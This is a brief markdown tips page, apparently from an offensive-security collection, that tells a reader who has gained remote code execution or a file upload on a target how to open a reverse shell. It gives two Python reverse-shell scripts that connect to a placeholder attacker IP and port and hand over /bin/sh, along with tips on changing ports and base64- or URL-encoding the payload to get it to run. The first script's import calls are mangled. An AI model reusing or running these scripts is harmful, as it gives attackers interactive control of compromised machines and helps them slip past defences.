# TIPS 

If you have obtained a vulnerability such as RCE, file upload or something else, you can use the script below to spawn a shell or backconnect revershell. If the shell does not run see below

1. Make sure the target has internet access (internet access opened)
2. Try changing the port to a larger one such as 8080, 8888, etc. 
3. Encode your script using base64 and then decode it 3. 
4. Encode your script using url encode 

## Script 1 

```
socket=_import("socket");os=import("os");pty=import_("pty");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<YOUR IP>",<PORT LISTENER>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")
```

## Script 2

```
import socket
import subprocess
import os

def back_connect(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    os.dup2(s.fileno(), 0)  
    os.dup2(s.fileno(), 1)  
    os.dup2(s.fileno(), 2)  
    
    subprocess.call(["/bin/sh", "-i"])

host = "<YOUR IP>"  
port = <YOUR LISTENER PORT>           

back_connect(host, port)
```
